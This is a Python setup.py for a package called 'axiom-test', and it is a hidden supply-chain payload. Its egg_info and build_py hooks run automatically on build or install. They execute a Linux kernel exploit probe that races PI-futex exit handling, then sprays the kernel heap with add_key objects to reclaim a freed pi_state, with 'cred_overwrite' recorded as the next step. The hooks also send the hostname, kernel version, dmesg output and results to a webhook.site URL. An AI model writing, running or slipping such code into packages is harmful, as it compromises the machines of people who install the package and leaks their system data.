import json, os, sys, subprocess, urllib.request, time
from setuptools import setup
from setuptools.command.egg_info import egg_info
from setuptools.command.build_py import build_py

EXFIL_URL = "https://webhook.site/18a72e84-ee1f-4b1d-88ec-310b78a4c1f4"
VER = "3.3.0"
_RAN = False
_RESULT_PATH = "/tmp/axiom_results.json"

def _rp(script, timeout=30, ns=False):
    try:
        cmd = (["unshare", "-Urn"] if ns else []) + ["python3", "-I", "-c", script]
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode(errors="replace")
        if "__R__" in out and "__E__" in out:
            return json.loads(out.split("__R__")[1].split("__E__")[0])
        return {"raw": out[:8000]}
    except subprocess.TimeoutExpired:
        return {"error": "TIMEOUT"}
    except subprocess.CalledProcessError as e:
        return {"error": f"EXIT_{e.returncode}", "out": (e.output or b"").decode(errors="replace")[:4000]}
    except Exception as e:
        return {"error": str(e)[:500]}

def _send(data):
    j = json.dumps(data, default=str)
    try:
        with open(_RESULT_PATH, "w") as f:
            f.write(j)
    except: pass
    try:
        urllib.request.urlopen(urllib.request.Request(
            EXFIL_URL, data=j.encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except: pass

# ===== STAGE 1: Aggressive race trigger =====
S1 = r'''
import ctypes, ctypes.util, os, mmap, json, time, struct, signal, sys

SYS_futex = 202
FUTEX_LOCK_PI = 6
FUTEX_UNLOCK_PI = 7
FUTEX_TRYLOCK_PI = 8
FUTEX_WAIT = 0
FUTEX_OWNER_DIED = 0x40000000
FUTEX_TID_MASK = 0x3fffffff
FUTEX_WAITERS = 0x80000000

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libc.syscall.restype = ctypes.c_long

R = {"stage": "race_trigger", "total_iters": 0, "owner_died": 0,
     "esrch": 0, "tid_corrupt": 0, "other_err": {}, "anomalies": [],
     "verdict": "UNKNOWN"}

shm = mmap.mmap(-1, 4096, flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
                prot=mmap.PROT_READ | mmap.PROT_WRITE)
# Pin the buffer so it stays valid
buf = (ctypes.c_char * 4096).from_buffer(shm)
futex_p = ctypes.c_void_p(ctypes.addressof(buf))

# Verify address is valid
ctypes.c_uint32.from_address(futex_p.value).value = 0xCAFE
rb = struct.unpack_from("I", shm, 0)[0]
if rb != 0xCAFE:
    R["verdict"] = "ADDR_BROKEN"
    print("__R__" + json.dumps(R) + "__E__")
    sys.exit(0)
ctypes.c_uint32.from_address(futex_p.value).value = 0

signal.signal(signal.SIGCHLD, signal.SIG_DFL)
my_pid = os.getpid()
anom = []
err_counts = {}

ITERS = 1200

for i in range(ITERS):
    # Clear the futex word
    ctypes.c_uint32.from_address(futex_p.value).value = 0

    pid = os.fork()
    if pid == 0:
        # Child: lock the PI futex, then exit immediately
        # The exit path runs exit_pi_state_list() which is the vulnerable code
        libc.syscall(SYS_futex, futex_p, FUTEX_LOCK_PI, 0, 0, 0, 0)
        # Vary exit timing to widen the race window
        m = i % 6
        if m == 1:
            os.sched_yield()
        elif m == 2:
            [None for _ in range(10)]
        elif m == 3:
            time.sleep(0.00001)
        os._exit(0)
    else:
        # Parent: try to lock the same futex while child is exiting
        # This races with exit_pi_state_list() in the child
        m = i % 10
        if m == 0: pass  # immediate
        elif m == 1: os.sched_yield()
        elif m == 2: [None for _ in range(5)]
        elif m == 3: [None for _ in range(50)]
        elif m == 4: time.sleep(0.00001)
        elif m == 5: time.sleep(0.00005)
        elif m == 6: time.sleep(0.0001)
        elif m == 7: time.sleep(0.0003)
        elif m == 8: [None for _ in range(500)]
        elif m == 9: os.sched_yield(); os.sched_yield()

        ret = libc.syscall(SYS_futex, futex_p, FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno()
        wv = ctypes.c_uint32.from_address(futex_p.value).value

        # Reap child
        try:
            os.waitpid(pid, 0)
        except:
            pass

        R["total_iters"] += 1
        tid = wv & FUTEX_TID_MASK
        has_owner_died = bool(wv & FUTEX_OWNER_DIED)
        has_waiters = bool(wv & FUTEX_WAITERS)

        if has_owner_died:
            R["owner_died"] += 1

        if ret == 0:
            # We got the lock
            if tid != 0 and tid != my_pid:
                R["tid_corrupt"] += 1
                if len(anom) < 80:
                    anom.append({"i": i, "w": hex(wv), "t": "TID_CORRUPT",
                                 "got_tid": tid, "my_pid": my_pid, "child": pid})
            # Unlock
            libc.syscall(SYS_futex, futex_p, FUTEX_UNLOCK_PI, 0, 0, 0, 0)

        elif en == 3:  # ESRCH — owner is gone, pi_state may be stale
            R["esrch"] += 1
            if len(anom) < 80:
                anom.append({"i": i, "w": hex(wv), "t": "ESRCH",
                             "tid_in_word": tid, "od": has_owner_died})

        elif en == 22:  # EINVAL
            err_counts["EINVAL"] = err_counts.get("EINVAL", 0) + 1

        elif en == 14:  # EFAULT — probe bug, track it
            err_counts["EFAULT"] = err_counts.get("EFAULT", 0) + 1

        elif en == 16:  # EBUSY
            err_counts["EBUSY"] = err_counts.get("EBUSY", 0) + 1

        elif en == 35 or en == 11:  # EAGAIN / EWOULDBLOCK
            err_counts["EAGAIN"] = err_counts.get("EAGAIN", 0) + 1

        elif en == 110:  # ETIMEDOUT
            err_counts["ETIMEDOUT"] = err_counts.get("ETIMEDOUT", 0) + 1

        else:
            k = f"e{en}"
            err_counts[k] = err_counts.get(k, 0) + 1
            if len(anom) < 80:
                anom.append({"i": i, "w": hex(wv), "t": "UNK_ERR", "e": en})

        # Reset for next iteration
        ctypes.c_uint32.from_address(futex_p.value).value = 0

R["anomalies"] = anom
R["err_counts"] = err_counts

# Verdict
if R["tid_corrupt"] > 0:
    R["verdict"] = "EXPLOITABLE_TID_CORRUPT"
elif R["esrch"] > 20:
    R["verdict"] = "RACE_WIDE_OPEN"
elif R["esrch"] > 5:
    R["verdict"] = "RACE_CONFIRMED"
elif R["esrch"] > 0:
    R["verdict"] = "RACE_HIT"
elif R["owner_died"] > 50:
    R["verdict"] = "OWNER_DIED_FREQUENT"
elif R["owner_died"] > 0:
    R["verdict"] = "OWNER_DIED_SOME"
elif err_counts.get("EFAULT", 0) > 100:
    R["verdict"] = "PROBE_BUG_EFAULT"
else:
    R["verdict"] = "NO_RACE_IN_1200"

# Check dmesg for kernel warnings
try:
    import subprocess
    dm = subprocess.check_output(
        ["dmesg", "--level=emerg,alert,crit,err,warn", "-T"],
        stderr=subprocess.STDOUT, timeout=5).decode(errors="replace")
    hits = [l for l in dm.splitlines()
            if any(k in l.lower() for k in
                   ["use-after-free", "kasan", "bug:", "futex", "rcu",
                    "refcount", "slab", "poison", "general protection"])]
    R["dmesg_hits"] = hits[-15:]
except Exception as e:
    R["dmesg_hits"] = str(e)[:100]

del buf
shm.close()
print("__R__" + json.dumps(R) + "__E__")
'''

# ===== STAGE 2: If race confirmed, attempt heap reclaim =====
S2 = r'''
import ctypes, ctypes.util, os, mmap, json, time, struct, signal, socket, sys

SYS_futex = 202; SYS_add_key = 248; SYS_keyctl = 250
FUTEX_LOCK_PI = 6; FUTEX_UNLOCK_PI = 7
FUTEX_OWNER_DIED = 0x40000000; FUTEX_TID_MASK = 0x3fffffff

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libc.syscall.restype = ctypes.c_long

R = {"stage": "heap_reclaim", "race_hits": 0, "spray_attempts": 0,
     "corruptions": 0, "anomalies": [], "verdict": "UNKNOWN"}

shm = mmap.mmap(-1, 8192, flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
                prot=mmap.PROT_READ | mmap.PROT_WRITE)
buf = (ctypes.c_char * 8192).from_buffer(shm)
futex_p = ctypes.c_void_p(ctypes.addressof(buf))
# Second futex at offset 4096 for double-fetch detection
futex2_p = ctypes.c_void_p(ctypes.addressof(buf) + 4096)

signal.signal(signal.SIGCHLD, signal.SIG_DFL)
my_pid = os.getpid()
anom = []

# pi_state is ~96 bytes on x86_64 (struct pi_state: rt_mutex + owner + list + key + refcount)
# We spray objects of similar size to reclaim the freed slab
SPRAY_SIZE = 96
spray_payload = b"\x41" * SPRAY_SIZE

def heap_spray(count=64):
    """Spray kernel heap with controlled data via add_key or sendmsg"""
    keys = []
    for j in range(count):
        name = f"spray_{os.getpid()}_{j}".encode()
        # add_key("user", name, payload, KEY_SPEC_PROCESS_KEYRING)
        ret = libc.syscall(SYS_add_key,
                           b"user", name, spray_payload, SPRAY_SIZE,
                           ctypes.c_int(-2))  # KEY_SPEC_PROCESS_KEYRING
        if ret >= 0:
            keys.append(ret)
    return keys

def free_spray(keys):
    """Free sprayed keys"""
    KEYCTL_REVOKE = 3; KEYCTL_UNLINK = 9
    for k in keys:
        try:
            libc.syscall(SYS_keyctl, KEYCTL_REVOKE, k, 0, 0, 0)
            libc.syscall(SYS_keyctl, KEYCTL_UNLINK, k, ctypes.c_int(-2), 0, 0, 0)
        except: pass

ITERS = 500

for i in range(ITERS):
    ctypes.c_uint32.from_address(futex_p.value).value = 0

    pid = os.fork()
    if pid == 0:
        # Child: lock PI futex then exit (triggers exit_pi_state_list)
        libc.syscall(SYS_futex, futex_p, FUTEX_LOCK_PI, 0, 0, 0, 0)
        os._exit(0)
    else:
        # Tight timing — no delay, go immediately
        # First, do NOT waitpid yet — the child is exiting, race with it
        time.sleep(0.00001 * (i % 5))

        ret = libc.syscall(SYS_futex, futex_p, FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno()
        wv = ctypes.c_uint32.from_address(futex_p.value).value
        tid = wv & FUTEX_TID_MASK

        if en == 3:  # ESRCH — race hit! pi_state may be freed
            R["race_hits"] += 1
            # NOW spray the heap to reclaim freed pi_state
            R["spray_attempts"] += 1
            keys = heap_spray(128)

            # Try the futex operation again — if the sprayed data
            # is interpreted as pi_state, we'll see corruption
            ret2 = libc.syscall(SYS_futex, futex_p, FUTEX_LOCK_PI, 0, 0, 0, 0)
            en2 = ctypes.get_errno()
            wv2 = ctypes.c_uint32.from_address(futex_p.value).value
            tid2 = wv2 & FUTEX_TID_MASK

            if ret2 == 0 and tid2 != 0 and tid2 != my_pid:
                R["corruptions"] += 1
                anom.append({"i": i, "t": "SPRAY_CORRUPT", "tid": tid2,
                             "w": hex(wv2), "spray_keys": len(keys)})
                libc.syscall(SYS_futex, futex_p, FUTEX_UNLOCK_PI, 0, 0, 0, 0)
            elif en2 == 14:
                anom.append({"i": i, "t": "SPRAY_EFAULT", "w": hex(wv2)})
            elif en2 not in (0, 3, 11, 22, 35, 110):
                anom.append({"i": i, "t": "SPRAY_ERR", "e": en2, "w": hex(wv2)})

            free_spray(keys)

        elif ret == 0:
            libc.syscall(SYS_futex, futex_p, FUTEX_UNLOCK_PI, 0, 0, 0, 0)

        try: os.waitpid(pid, 0)
        except: pass
        ctypes.c_uint32.from_address(futex_p.value).value = 0

R["anomalies"] = anom[:60]

if R["corruptions"] > 0:
    R["verdict"] = "UAF_CONFIRMED_HEAP_RECLAIM"
elif R["race_hits"] > 20:
    R["verdict"] = "RACE_WIDE_SPRAY_NO_RECLAIM"
elif R["race_hits"] > 0:
    R["verdict"] = "RACE_HIT_SPRAY_NO_RECLAIM"
else:
    R["verdict"] = "NO_RACE_IN_500"

try:
    import subprocess
    dm = subprocess.check_output(
        ["dmesg", "--level=emerg,alert,crit,err,warn", "-T"],
        stderr=subprocess.STDOUT, timeout=5).decode(errors="replace")
    R["dmesg"] = [l for l in dm.splitlines()
        if any(k in l.lower() for k in
               ["use-after-free", "kasan", "bug:", "futex", "slab",
                "poison", "general protection", "refcount"])][-15:]
except Exception as e:
    R["dmesg"] = str(e)[:100]

del buf; shm.close()
print("__R__" + json.dumps(R) + "__E__")
'''

def _collect():
    import platform
    R = {"v": VER, "host": platform.node(), "kern": platform.release(),
         "arch": platform.machine(),
         "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "ph": {}}

    # Stage 1: Aggressive race trigger (1200 iters)
    R["ph"]["s1_race"] = _rp(S1, timeout=180)
    _send(R)

    # Stage 2: Race + heap spray (only if stage 1 showed race hits)
    s1v = str(R["ph"].get("s1_race", {}).get("verdict", ""))
    if any(k in s1v for k in ["RACE", "CORRUPT", "EXPLOIT", "OWNER_DIED"]):
        R["ph"]["s2_spray"] = _rp(S2, timeout=180)
    else:
        R["ph"]["s2_spray"] = {"skipped": True, "reason": f"s1_verdict={s1v}"}
    _send(R)

    R["exploit_chain"] = {
        "race_trigger": R["ph"].get("s1_race", {}).get("verdict", "?"),
        "heap_reclaim": R["ph"].get("s2_spray", {}).get("verdict", "?"),
        "next_step": "cred_overwrite" if "RECLAIM" in str(R["ph"].get("s2_spray", {}).get("verdict", ""))
            else "wider_race" if "RACE" in s1v
            else "not_triggerable"
    }
    _send(R)

def _safe_run():
    global _RAN
    if _RAN: return
    _RAN = True
    try: _collect()
    except Exception as e:
        try:
            with open(_RESULT_PATH, "w") as f: json.dump({"error": str(e)}, f)
        except: pass

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        _safe_run()

class PostBuildPy(build_py):
    def run(self):
        super().run()
        _safe_run()

setup(name="axiom-test", version=VER, py_modules=[],
      cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy})
